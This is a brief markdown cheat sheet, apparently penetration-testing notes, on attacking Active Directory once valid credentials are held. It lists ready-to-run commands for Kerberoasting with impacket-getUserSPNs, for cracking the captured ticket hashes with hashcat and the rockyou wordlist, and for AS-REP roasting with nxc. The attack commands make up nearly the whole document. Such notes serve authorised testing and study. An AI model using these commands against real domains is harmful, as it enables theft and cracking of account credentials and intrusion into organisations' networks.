# Valid Credentials

### 1) Kerberoasting

Do a Kerberoasting attack

    impacket-getUserSPNs -request -dc-ip DC_IP domain/user:password -outputfile kerberoasted.txt

Crack hash

    hashcat -a 0 -m 13100 kerberoasted.txt /usr/share/wordlists/rockyou.txt

### 2) ASREProasting

Do an ASREProasting attack

    nxc ldap DC_IP -u user -p password --kdchost DC_IP --asrep
